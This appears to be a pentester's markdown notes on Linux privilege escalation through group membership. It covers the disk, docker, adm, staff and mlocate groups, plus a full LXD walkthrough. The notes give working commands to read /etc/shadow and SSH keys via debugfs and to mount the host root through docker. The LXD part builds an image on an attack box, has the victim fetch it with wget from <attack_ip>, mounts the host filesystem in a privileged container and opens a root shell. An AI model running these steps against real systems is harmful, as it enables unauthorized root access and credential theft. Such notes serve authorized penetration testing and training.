https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/

Can be exploited
    sudo/admin/wheel
    video
    disk
	    `df -h`
	    then
	    whatever filesystem is mounted on /
	    `debugfs <file_system>`
	    `mkdir test`
	    `cat <whatever_file_we_want> `(consider ssh files, /etc/shadow, etc)
    shadow
    adm
	    can read /var/log/*
    docker
	    `docker images
	    then
	    `docker run -v /:/mnt --rm -it <image> chroot /mnt sh``
    LXC/LXD

## LXD
LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. There are multiple ways to exploit this

LXD PrivEsc
```bash
## ON ATTACK_BOX
# Install tools
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools  

# Clone repo  
git clone https://github.com/lxc/distrobuilder  

# Make distrobuilder  
cd distrobuilder  
make  

# Prepare the creation of alpine  
mkdir -p $HOME/ContainerImages/alpine/  
cd $HOME/ContainerImages/alpine/  
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml  

# Create the container  
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18

# Start http server 
python3 -m http.server <port>

________________________________
## ON VICTIM

# Transfer to target
wget <attack_ip>:<port>/lxd.tar.xz
wget <attack_ip>:<port>/rootfs.squashfs

# Add Image
/snap/bin/lxc  image import lxd.tar.xz rootfs.squashfs --alias alpine

# Verify
/snap/bin/lxc image list

# Start lxc init
/snap/bin/lxc init
	# Enter for all questions

/snap/bin/lxc init alpine privesc -c security.privileged=true

/snap/bin/lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# Start privesc
snap/bin/lxc start privesc

# Execute root shell
/snap/bin/lxc exec privesc /bin/sh
```


## staff
https://binaryregion.wordpress.com/2021/09/22/privilege-escalation-linux-staff-group/
allows users to add /usr/local modifications without root priv


## mlocate

`find / -group mlocate 2>/dev/null | grep -v '^/proc\|^/run\|^/sys\|^/snap'`
	this will reveal the location of the mlocate database which contains all the files we may need
`strings mlocate.db`
	this reveals all the files that can be LOCATED
	may need to transfer back mloacte.db to KALI machine to run `strings` on it
example usage
	`strings mlocate.db | grep creds`
		creds-for-2022.txt
		we now know this file exists somewhere
		locate may uncover its location but if permissions are insufficient, locate will still not work
		